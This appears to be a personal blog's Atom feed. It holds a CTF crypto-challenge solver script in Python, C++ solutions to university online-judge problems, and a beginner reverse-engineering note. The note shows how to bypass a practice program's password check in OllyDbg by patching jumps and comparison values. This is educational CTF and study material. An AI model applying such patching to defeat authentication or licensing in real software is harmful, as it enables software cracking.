ekey1 = 'xtfsyhhlizoiyx'
ekey2 = 'eudlqgluduggdluqmocgyukhbqkx'
eflag = 'lvvrafwgtocdrdzfdqotiwvrcqnd'

scramble_map = ['v', 'r', 't', 'p', 'w', 'g', 'n', 'c', 'o', 'b', 'a', 'f', 'm', 'i', 'l', 'u', 'h', 'z', 'd', 'q', 'j', 'y', 'x', 'e', 'k', 's']
# result of the evaluation of (sys.maxsize % 28) for 64-bit machines
randsize = 7
# to choose whether or not to swap key1 and key2
swapkeys = True
# write the resulting flag combinations to a file
outfile = 'results.txt'

# reverse enc1, but provide n
def dec1(text, n):
    assert(0 &lt;= n &lt; 28)
    return text[-n:] + text[:-n]

# reverse enc2
def dec2(text):
    # map each character of text to the character of order :
    # index of text[i] in scramble_map + ord('a')
    return ''.join(chr(scramble_map.index(char) + ord('a')) for char in text)

# recover key2 from the encrypted key2 (the part where random chars are appended to key2)
def recover_key2(ekey2):
    assert(len(ekey2) == 28)
    # the random characters are the 14 first
    k = ekey2[:14]
    # the list of `a`s
    alist = list(map(ord, ekey2[14:]))
    res = ''
    for i in range(14):
        # we simply compute c using linear equations
        c = alist[i] - ord(k[i]) + ord('a')
        # since all characters are ascii lowercase
        # this check helps avoiding multiple potential values
        if not ord('a') &lt;= c &lt;= ord('z'):
            c += 122 - 97
        res += chr(c)
    return res

# undo the big double loop
def unloop(key1, key2, flag):
    key1, key2, flag = list(key1), list(key2), list(flag)
    assert (len(key1) == len(key2) == 14)
    for j in range(2):
        # we make sure the range is from 27 to 14, not 14 to 27
        for i in range(27, 13, -1):
            # taking advantage of python's built-in way to swap values
            # rather than using a temp variable
            index = (ord(key1[i-14]) - ord('a')) % 14
            key2[index], key2[i-14] = key2[i-14], key2[index]

            index = (ord(key2[i-14]) - ord('a')) % 28
            flag[i], flag[index] = flag[index], flag[i]

        for i in range(13, -1, -1):
            index = (ord(key2[i]) - ord('a')) % 14
            key1[index], key1[i] = key1[i], key1[index]

            index = (ord(key1[i]) - ord('a')) % 28
            flag[i], flag[index] = flag[index], flag[i]

    return ''.join(key1), ''.join(key2), ''.join(flag)

if __name__ == '__main__':
    # generate the combinations of 3 `n`s using itertools.product
    combinations = [p for p in itertools.product(range(randsize+1), repeat=3)]
    key1 = ekey1
    key2 = recover_key2(dec2(ekey2))
    flag = dec2(eflag)
    if swapkeys: key1, key2 = key2, key1
    original = flag, key1, key2
    results = []
    for c in combinations:
        flag = dec1(dec1(dec1(flag, c[0]), c[1]), c[2])
        key1, key2, flag = unloop(key1, key2, flag)
        if dec2(dec2(key2)) == key1:
            for n in range(randsize + 1):
                flag = dec1(flag, n)
                results.append(flag)
        flag, key1, key2 = original
    with open(outfile, 'w') as f:
        f.write('\n'.join(results))
        f.close()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CUMTOJ部分题解(更新中)]]></title>
        <id>https://7usai.github.io/post/cumtoj-bu-fen-ti-jie-geng-xin-zhong/</id>
        <link href="https://7usai.github.io/post/cumtoj-bu-fen-ti-jie-geng-xin-zhong/">
        </link>
        <updated>2020-09-08T15:09:17.000Z</updated>
        <content type="html"><![CDATA[<h2 id="大白just大白">大白just大白</h2>
<h3 id="题目描述">题目描述</h3>
<p>大家都知道，大白对学术要求是很严格的。抄作业、考试作弊神马的在大白这简直不能忍。</p>
<p>这不刚刚过去的期末考试。有n个学生被查出来有问题。</p>
<p>大白给了他们申辩的机会，每个学生可以提交一段文字，作为申辩理由。但是大白发现来的人总会有一些奇怪的理由。</p>
<p>大白提前列了m个常见借口关键字。他想看看来申辩的学生中最烂的申辩理由是什么。</p>
<p>所谓最烂申辩理由就是，申辩里，含有常见借口关键字最多的。</p>
<p>含有关键字，指的是，理由中出现了一串和关键字完全匹配的字符串，如果出现大写小写不同，也认为匹配。比如，关键字是 bed 理由中出现Bedroom算含有一个关键字。</p>
<h3 id="输入">输入</h3>
<p>一个输入可能有多个case，每个case第一行两个数。分别代表n 和 m</p>
<p>接下来m行，每行一个关键字（字符串）</p>
<p>再接下来n行字符串。m和n都不大于20</p>
<p>每一个借口和借口关键字只会包含大小写字母，长度不会超过4000个字符。</p>
<h3 id="输出">输出</h3>
<p>对于每个case输出一行字符串，表示最烂的理由。若有多个理由包含相同数目的关键字，按输入顺序输出靠前的那个。</p>
<h3 id="样例输入">样例输入</h3>
<pre><code>2 3
love
cumt
ACM
ILoveCUMTACM
cumtAACM
2 2
A
b
Ab
bA
</code></pre>
<h3 id="样例输出">样例输出</h3>
<pre><code>ILoveCUMTACM
Ab
</code></pre>
<h3 id="代码">代码</h3>
<pre><code>#include&lt;iostream&gt;
#include&lt;string&gt;
using namespace std;
int main()
{
	int max= 21;
    int n,m,i,j;
    string nn[max],mm[max];
    string nn2[max],mm2[max];
    while(cin&gt;&gt;n&gt;&gt;m)
    {
   		for(int i=0;i&lt;m;i++)
		{
			cin&gt;&gt;mm[i];
			mm2[i]=mm[i];
			for(int j = 0; mm[i][j] != '\0'; j++)
            {
                mm[i][j] = tolower(mm[i][j]);
            }
            //cout&lt;&lt;mm[i]&lt;&lt;mm2[i]; 
		}
		for(int i=0;i&lt;n;i++)
		{
			cin&gt;&gt;nn[i];
			nn2[i]=nn[i];
			for(int j = 0; nn[i][j] != '\0'; j++)
            {
                nn[i][j] = tolower(nn[i][j]);
            }
            //cout&lt;&lt;nn[i];
		}
        int p=-1,q=-1,k;
        for(i = 0; i &lt; n; i++)
        {
            k= 0;
            for(j = 0; j &lt; m; j++)
            {
                string::size_type temp = nn[i].find(mm[j]);
                if(temp!=string::npos)
				k++;
            }
            if(k&gt;p)
            {
                p=k;
                q=i;
            }
        }
        cout&lt;&lt;nn2[q]&lt;&lt;endl;
    }
    return 0;
}
</code></pre>
<h2 id="小雏鸟的计算">小雏鸟的计算</h2>
<h3 id="题目描述-2">题目描述</h3>
<p>小雏鸟们的三角形翅膀终于长出健壮的肌肉和丰满的羽毛，已经跃跃欲试的去准备尝试挑战新的难题了。</p>
<p>考虑以下的算法：<br>
\1.     输入 n<br>
\2.     印出 n<br>
\3.     如果 n = 1 结束<br>
\4.     如果 n 是奇数 那么 n=3*n+1<br>
\5.     否则 n=n/2<br>
\6.     GOTO 2<br>
例如输入 22 得到的数列： 22 11 34 17 52 26 13 40 20 10 5 16 8 4 2 1<br>
据推测此算法对任何整数而言会终止 (当打印出 1 的时候)。虽然此算法很简单，但以上的推测是否真实却无法知道。然而对所有的n ( 0 &lt; n &lt; 1000000 )来说，以上的推测已经被验证是正确的。<br>
给一个输入 n 透过以上的算法我们可以得到一个数列（1作为结尾）。此数列的长度称为n的cycle length。上面提到的例子 22的 cycle length为 16.<br>
问题来了：对任2个整数i，j我们想要知道介于i，j（包含i，j）之间的数所产生的数列中最大的cycle length是多少。</p>
<h3 id="输入-2">输入</h3>
<p>输入可能包含了好几行测试数据，每一行有一对整数 i，j 。</p>
<p>0&lt; i，j &lt; 1000000</p>
<h3 id="输出-2">输出</h3>
<p>对每一对输入 i j你应该要输出 i j和介于i j之间的数所产生的数列中最大的cycle length。</p>
<h3 id="样例输入-2">样例输入</h3>
<pre><code>1 10
10 1
100 200
201 210
900 1000
</code></pre>
<h3 id="样例输出-2">样例输出</h3>
<pre><code>1 10 20
10 1 20
100 200 125
201 210 89
900 1000 174
</code></pre>
<h3 id="代码-2">代码</h3>
<pre><code>#include&lt;iostream&gt;
#include&lt;stdio.h&gt;
using namespace std;
int a;
void f(int x)
{
    if(x == 1) 
	return;
    if(x % 2) 
	x = 3*x+1;
    else 
	x /= 2;
    f(x);
    a++;
}
int count(int x)
{
    a = 1;
    f(x);
    return a;
}
int main()
{
    int l,r,l2,r2,max_;
    while(cin&gt;&gt;l&gt;&gt;r)
    {
    	l2=l;
    	r2=r;
        if(l2 &gt; r2)
		swap(l2,r2);
        max_ = 0;
        for(int i = l2; i &lt;= r2; i++)
            max_ = max(max_,count(i));
        cout&lt;&lt;l&lt;&lt;' '&lt;&lt;r&lt;&lt;' '&lt;&lt;max_&lt;&lt;endl;
    }
    return 0;
}
</code></pre>
<h2 id="排列问题">排列问题</h2>
<h3 id="题目描述-3">题目描述</h3>
<p>输入一个可能含有重复字符的字符串，打印出该字符串中所有字符的全排列。</p>
<h3 id="输入-3">输入</h3>
<p>单组测试数据，输入数据是一个长度不超过10个字符的字符串，以逗号结尾。</p>
<h3 id="输出-3">输出</h3>
<p>打印出该字符串中所有字符的全排列。以字典序顺序输出，用空格分隔。</p>
<h3 id="样例输入-3">样例输入</h3>
<pre><code>abc,
</code></pre>
<h3 id="样例输出-3">样例输出</h3>
<pre><code>abc acb bac bca cab cba
</code></pre>
<h3 id="代码-3">代码</h3>
<pre><code>#include&lt;iostream&gt;
#include&lt;algorithm&gt;
using namespace std;
int main()
{
	string s;
	cin&gt;&gt;s;
	s=s.substr(0,s.length()-1);
	sort(s.begin(),s.end());
	cout&lt;&lt;s&lt;&lt;&quot; &quot;;
	while(next_permutation(s.begin(),s.end()))
	{
		cout&lt;&lt;s&lt;&lt;&quot; &quot;;
	}
	return 0;
}
</code></pre>
<h2 id="快速幂">快速幂</h2>
<h3 id="题目描述-4">题目描述</h3>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1599577873521.png" alt="" loading="lazy"></figure>
<h3 id="输入-4">输入</h3>
<p>多组测试样例，最多50组。每组测试样例给定一个整数x(1&lt;=x&lt;=25000)</p>
<h3 id="输出-4">输出</h3>
<p>对每个样例，输出一行，代表f(x)对100000007取余的结果。</p>
<h3 id="样例输入-4">样例输入</h3>
<pre><code>3
4
5
</code></pre>
<h3 id="样例输出-4">样例输出</h3>
<pre><code>33
289
3414
</code></pre>
<h3 id="代码-4">代码</h3>
<pre><code>#include&lt;iostream&gt;
using namespace std;
long long n=100000007;
long long poww(long long a, long long b)// return a ^ b
{
	long long ans = 1;
	while(b != 0)
	{
		if(b&amp;1 != 0) 
		ans = ans * a % n;
		a = a * a %n;
		b&gt;&gt;=1;
	}
return ans;
}
int main()
{
	int x;
	while(cin&gt;&gt;x)
	{
		long long y=0;
		for(int i=1;i&lt;=x;i++)
		y+=poww(i,i);
		cout&lt;&lt;(y+1)%n&lt;&lt;endl;
	}
	return 0;
} 
</code></pre>
<h2 id="求第k小">求第k小</h2>
<h3 id="题目描述-5">题目描述</h3>
<p>给定n(1&lt;=n&lt;=1000000)个元素，求第k小数(1&lt;=k&lt;=n)。</p>
<h3 id="输入-5">输入</h3>
<p>一组样例。第一行输入两个整数n和k。第二行输入n个不同的int范围内的数。</p>
<h3 id="输出-5">输出</h3>
<p>输出一行，输出第k小数。</p>
<h3 id="样例输入-5">样例输入</h3>
<pre><code>5 2
1 5 3 2 4
</code></pre>
<h3 id="样例输出-5">样例输出</h3>
<pre><code>2
</code></pre>
<h3 id="代码-5">代码</h3>
<pre><code>#include &lt;iostream&gt;
using namespace std;
int a[1000001];
void swap(int &amp;a, int &amp;b)
{
	int temp = a;
	a = b;
	b = temp;
}
int partition(int arr[], int left, int right)  //找基准数 划分
{
    int i = left + 1 ;
    int j = right;
    int temp = arr[left];
 
    while(i &lt;= j)
    {
        while (arr[i] &lt; temp)
        {
            i++;
        }
        while (arr[j] &gt; temp )
        {
            j--;
        }
        if (i &lt; j)
            swap(arr[i++], arr[j--]);
        else i++;
   }
    swap(arr[j], arr[left]);
    return j; 
}
void quicksort(int a[],int left,int right)
{
	if(left &lt; right)
	{
		int j= partition(a, left, right);
	    quicksort(a, left, j - 1);
		quicksort(a, j + 1, right);	
	}
}
int main()
{
	int n, k;
	cin &gt;&gt; n;
	cin &gt;&gt; k; 
	for(int i = 0; i &lt; n; i++)
		cin &gt;&gt; a[i];
	quicksort(a, 0, n-1);
	cout &lt;&lt; a[k - 1] &lt;&lt; endl;
	return 0;	
}
</code></pre>
<h2 id="沙子的质量dp题">沙子的质量(dp题)</h2>
<h3 id="题目描述-6">题目描述</h3>
<p>设有N堆沙子排成一排，其编号为1，2，3，…，N（N&lt; =300）。每堆沙子有一定的数量，可以用一个整数来描述，现在要将N堆沙子合并成为一堆，每次只能合并相邻的两堆，合并的代价为这两堆沙子的数量之和，合并后与这两堆沙子相邻的沙子将和新堆相邻，合并时由于选择的顺序不同，合并的总代价也不相同，如有4堆沙子分别为1 3 5 2我们可以先合并1、2堆，代价为4，得到4 5 2又合并1，2堆，代价为9，得到9 2，再合并得到11，总代价为4+9+11=24，如果第二步是先合并2，3堆，则代价为7，得到4 7，最后一次合并代价为11，总代价为4+7+11=22；问题是：找出一种合理的方法，使总的代价最小。输出最小代价。</p>
<h3 id="输入-6">输入</h3>
<p>第一行一个数N表示沙子的堆数N。 第二行N个数，表示每堆沙子的质量。 a[i]&lt; =1000。</p>
<h3 id="输出-6">输出</h3>
<p>合并的最小代价。</p>
<h3 id="样例输入-6">样例输入</h3>
<pre><code>4
1 3 5 2
</code></pre>
<h3 id="样例输出-6">样例输出</h3>
<pre><code>22
</code></pre>
<h3 id="代码-6">代码</h3>
<pre><code>#include&lt;iostream&gt;
#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
using namespace std;
int main()
{
	int dp[300][300];
    int n,i,j,k,a[300],sum[300] = {0};
   	//cout&lt;&lt;sizeof(dp);
	memset(dp,1,sizeof(dp));
    cin&gt;&gt;n;
    for(i = 1; i &lt;= n; i++)
    {
        cin&gt;&gt;a[i];
        sum[i] = sum[i-1]+a[i];
        dp[i][i] = 0;
    }
    for(i = 2; i &lt;= n; i++)
    {
        for(j = i; j &gt;= 1; j--)
        {
            for(k = j; k &lt;= i; k++)
                dp[j][i] = min(dp[j][i],dp[j][k]+dp[k+1][i]+sum[i]-sum[j-1]);
        }
    }
    cout&lt;&lt;dp[1][n];
    return 0;
}
</code></pre>
<h2 id="最长公共子序列dp题">最长公共子序列(dp题)</h2>
<h3 id="题目描述-7">题目描述</h3>
<p>一个字符串A的子串被定义成从A中顺次选出若干个字符构成的串。如A=“cdaad&quot; ,顺次选1，3，5个字符就构成子串&quot; cad&quot; ,现给定两个字符串，求它们的最长共公子串。</p>
<h3 id="输入-7">输入</h3>
<p>第一行两个字符串用空格分开。两个串的长度均小于2000 。</p>
<h3 id="输出-7">输出</h3>
<p>最长子串的长度。</p>
<h3 id="样例输入-7">样例输入</h3>
<pre><code>abccd aecd
</code></pre>
<h3 id="样例输出-7">样例输出</h3>
<pre><code>3
</code></pre>
<h3 id="代码-7">代码</h3>
<pre><code>#include&lt;iostream&gt;
#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
using namespace std;
int dp[2000][2000]; 
int main()
{
	int len1,len2,i,j;
    char a[2000],b[2000];
    cin&gt;&gt;a&gt;&gt;b;
    len1 = strlen(a);
	len2 = strlen(b);
    for( i = 1; i &lt;= len1; i++)
    {
        for( j = 1; j &lt;= len2; j++)
        {
            if(a[i-1] == b[j-1]) dp[i][j] = dp[i-1][j-1]+1;
            else dp[i][j] = max(dp[i-1][j],dp[i][j-1]);
        }
    }
    cout&lt;&lt;dp[len1][len2];
    return 0;
}
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[RE学习]]></title>
        <id>https://7usai.github.io/post/re-xue-xi/</id>
        <link href="https://7usai.github.io/post/re-xue-xi/">
        </link>
        <updated>2020-09-02T11:44:09.000Z</updated>
        <content type="html"><![CDATA[<h1 id="逆向软件基础">逆向软件基础</h1>
<p>debug版本较大、带调试信息，release版本优化程序、程序更小</p>
<h2 id="od快捷键">OD快捷键</h2>
<pre><code>F2 下断点
F3 加载一个可执行程序
F4 程序执行到光标处
F5 缩小、还原当前窗口
F7 单步步入
F8 单步步过
F9 直接运行程序，遇到断点处，程序暂停
Ctrl + F2 重新运行程序到起始处
Ctrl + F9 执行到函数返回处，用于跳出函数实现
Ctrl + G 输入十六进制地址，快速定位到该地址处
Ctrl + N 应用程序的输入表
Alt + B 显示断点窗口
Alt + C 显示 CPU 窗口
Alt + F9 执行到用户代码处，用于快速跳出系统函数
Ctrl+j跳转main函数
</code></pre>
<h2 id="寻找main函数od">寻找main函数(OD)</h2>
<p>1.寻找参考字符串<br>
2.main函数特点：3个push、1个call,F7进入。<br>
3.API寻找<br>
4.IDA</p>
<h2 id="修改内存中的数据">修改内存中的数据</h2>
<p>1.OD:右键-&gt;二进制-&gt;编辑<br>
2.修改PUSH的地址以及该地址中的数据</p>
<h2 id="修改跳转">修改跳转</h2>
<p>1.修改关键跳转<br>
2.修改对比值</p>
<h2 id="滑板指令">滑板指令</h2>
<p>nop/90； 作用：把自己过掉执行下一句</p>
<h2 id="初级破解">初级破解</h2>
<h3 id="找到main函数所在位置">找到main函数所在位置</h3>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1599047100466.png" alt="" loading="lazy"></figure>
<h3 id="整体main函数">整体main函数</h3>
<pre><code>00181080  /$  55            push ebp
00181081  |.  8BEC          mov ebp,esp
00181083  |.  83EC 38       sub esp,0x38
00181086  |.  A1 04F01900   mov eax,dword ptr ds:[0x19F004]
0018108B  |.  33C5          xor eax,ebp
0018108D  |.  8945 FC       mov [local.1],eax
00181090  |.  68 A8D61900   push 05.0019D6A8
00181095  |.  E8 86FFFFFF   call 05.00181020
0018109A  |.  6A 32         push 0x32
0018109C  |.  8D45 C8       lea eax,[local.14]
0018109F  |.  6A 00         push 0x0
001810A1  |.  50            push eax
001810A2  |.  E8 790D0000   call 05.00181E20
001810A7  |.  8D45 C8       lea eax,[local.14]
001810AA  |.  50            push eax
001810AB  |.  68 B8D61900   push 05.0019D6B8                         ;  &quot;%s&quot;
001810B0  |.  E8 9BFFFFFF   call 05.00181050
001810B5  |.  8B45 C8       mov eax,[local.14]
001810B8  |.  33D2          xor edx,edx
001810BA  |.  83C4 18       add esp,0x18
001810BD  |.  3C 72         cmp al,0x72
001810BF  |.  0F94C2        sete dl
001810C2  |.  80FC 6B       cmp ah,0x6B
001810C5  |.  8D4A 01       lea ecx,dword ptr ds:[edx+0x1]
001810C8  |.  0F45CA        cmovne ecx,edx
001810CB  |.  807D CA 76    cmp byte ptr ss:[ebp-0x36],0x76
001810CF  |.  8D41 01       lea eax,dword ptr ds:[ecx+0x1]
001810D2  |.  0F45C1        cmovne eax,ecx
001810D5  |.  807D CB 69    cmp byte ptr ss:[ebp-0x35],0x69
001810D9  |.  8D48 01       lea ecx,dword ptr ds:[eax+0x1]
001810DC  |.  0F45C8        cmovne ecx,eax
001810DF  |.  807D CC 72    cmp byte ptr ss:[ebp-0x34],0x72
001810E3  |.  8D51 01       lea edx,dword ptr ds:[ecx+0x1]
001810E6  |.  0F45D1        cmovne edx,ecx
001810E9  |.  807D CD 00    cmp byte ptr ss:[ebp-0x33],0x0
001810ED  |.  8D42 01       lea eax,dword ptr ds:[edx+0x1]
001810F0  |.  0F45C2        cmovne eax,edx
001810F3  |.  83F8 05       cmp eax,0x5
001810F6  |.  76 07         jbe short 05.001810FF
001810F8  |.  68 BCD61900   push 05.0019D6BC                         ;  ASCII 6C,&quot;ogin sucess!\n&quot;
001810FD  |.  EB 05         jmp short 05.00181104
001810FF  |&gt;  68 CCD61900   push 05.0019D6CC                         ;  ASCII 6C,&quot;ogin failed!\n&quot;
00181104  |&gt;  E8 17FFFFFF   call 05.00181020
00181109  |.  83C4 04       add esp,0x4
0018110C  |.  68 DCD61900   push 05.0019D6DC                         ;  ASCII 70,&quot;ause&quot;
00181111  |.  E8 892A0000   call 05.00183B9F
00181116  |.  8B4D FC       mov ecx,[local.1]
00181119  |.  83C4 04       add esp,0x4
0018111C  |.  33CD          xor ecx,ebp
0018111E  |.  33C0          xor eax,eax
00181120  |.  E8 04000000   call 05.00181129
00181125  |.  8BE5          mov esp,ebp
00181127  |.  5D            pop ebp                                  ;  05.001812F1
00181128  \.  C3            retn

</code></pre>
<p>单步调试一遍</p>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1599047110988.png" alt="" loading="lazy"></figure>
<p>到这个位置显示请输入密码，随便敲一串字符继续调试</p>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1599047118404.png" alt="" loading="lazy"></figure>
<p>调试到此处显示登录失败</p>
<h3 id="破解方法">破解方法</h3>
<h4 id="方法1修改跳转">方法1：修改跳转</h4>
<p>经过初次调试可知00181020为printf，并添加各行作用注释</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1599047124421.png" alt="" loading="lazy"></figure>
<p>意思为eax&gt;5时，即上述对比字符串都相同时登录成功输出login success；<br>
过程：eax&gt;5，不执行jbe跳转，将login success压栈，跳转到call print函数位置；</p>
<p><img src="https://7usai.github.io/post-images/1599047131428.png" alt="" loading="lazy"><br>
修改后我们让它直接跳转到压栈位置。</p>
<h4 id="方法2修改关键字">方法2：修改关键字</h4>
<p>这里我们可知关键值时为eax，eax与5比较，大于5时才输出login success</p>
<p><img src="https://7usai.github.io/post-images/1599047137396.png" alt="" loading="lazy"><br>
我们在这里将eax值修改为大于5的数</p>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1599047146195.png" alt="" loading="lazy"></figure>
<h4 id="方法3分析得password">方法3：分析得password</h4>
<figure data-type="image" tabindex="6"><img src="https://7usai.github.io/post-images/1599047156075.png" alt="" loading="lazy"></figure>
<p>我们在这里可知，与0x72,0x6B,0x76,0x69,0x72,0x0做了对比相同则登录成功，于是密码为</p>
<p>思路：push eax 将输入的值存入了eax，ecx,edx两个中间值辅助eax+1.<br>
<img src="https://7usai.github.io/post-images/1599047162183.png" alt="" loading="lazy"></p>
<figure data-type="image" tabindex="7"><img src="https://7usai.github.io/post-images/1599047167384.png" alt="" loading="lazy"></figure>
<p>得到密码rkvir，成功</p>
<h4 id="方法4修改对比值">方法4：修改对比值</h4>
<p>即修改0x72,0x6B,0x76,0x69,0x72，让其与我们输入的值相同，即将我们输入的值变成password。</p>
<p>假如我们输入7usai就要改成0x37,0x75,0x73,0x61,0x69</p>
<figure data-type="image" tabindex="8"><img src="https://7usai.github.io/post-images/1599047173916.png" alt="" loading="lazy"></figure>
<p>登录成功</p>
<figure data-type="image" tabindex="9"><img src="https://7usai.github.io/post-images/1599047179674.png" alt="" loading="lazy"></figure>
<h2 id="mfc破解初试">MFC破解初试</h2>
<h3 id="初始界面">初始界面</h3>
<figure data-type="image" tabindex="10"><img src="https://7usai.github.io/post-images/1599295190085.png" alt="" loading="lazy"></figure>
<h3 id="修改跳转-2">修改跳转</h3>
<p><img src="https://7usai.github.io/post-images/1599295199199.png" alt="" loading="lazy"><br>
rkvir为密码已经可以看出，双击紫色行进入<br>
<img src="https://7usai.github.io/post-images/1599295206191.png" alt="" loading="lazy"><br>
修改跳转<br>
<img src="https://7usai.github.io/post-images/1599295211864.png" alt="" loading="lazy"></p>
<h3 id="修改密码">修改密码</h3>
<figure data-type="image" tabindex="11"><img src="https://7usai.github.io/post-images/1599295219313.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://7usai.github.io/post-images/1599295225417.png" alt="" loading="lazy"></figure>
<h2 id="初试破解crakeme">初试破解CrakeMe</h2>
<p><img src="https://7usai.github.io/post-images/1599295232305.png" alt="" loading="lazy"><br>
需要弹出下面的消息框</p>
<h3 id="改跳转">改跳转</h3>
<figure data-type="image" tabindex="13"><img src="https://7usai.github.io/post-images/1599295239334.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="14"><img src="https://7usai.github.io/post-images/1599295245091.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
</feed>